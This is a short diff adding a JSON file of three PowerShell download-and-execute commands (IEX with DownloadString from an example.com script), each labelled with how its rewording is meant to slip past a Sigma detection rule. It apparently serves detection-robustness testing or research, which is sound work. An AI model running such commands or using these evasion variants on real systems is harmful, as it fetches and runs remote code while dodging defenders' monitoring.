@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell -Command \"IEX ((New-Object Net.WebClient).DownloadString('http://example.com/script.ps1'))\"",
+    "explanation": "Insertion: Added quotes and escaped characters to modify the command line structure, potentially avoiding string matching in the Sigma rule."
+  },
+  {
+    "output": "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')",
+    "explanation": "Omission: Removed redundant parentheses to change the structure, possibly bypassing the specific string patterns in the Sigma rule."
+  },
+  {
+    "output": "powershell -Command \"(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1') | IEX\"",
+    "explanation": "Reordering: Changed the order of operations to avoid the exact string patterns matched by the Sigma rule."
+  }
+]
